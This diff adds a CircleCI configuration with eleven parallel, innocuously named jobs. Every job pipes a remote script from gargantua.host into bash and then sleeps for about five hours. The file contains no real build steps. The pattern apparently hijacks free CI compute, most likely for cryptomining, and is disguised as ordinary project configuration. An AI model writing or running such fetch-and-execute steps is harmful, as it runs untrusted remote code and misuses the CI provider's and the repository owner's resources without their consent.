@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  javascl:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  javascl10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - javascl
+      - javascl1
+      - javascl2
+      - javascl3
+      - javascl4
+      - javascl5
+      - javascl6
+      - javascl7
+      - javascl8
+      - javascl9
+      - javascl10
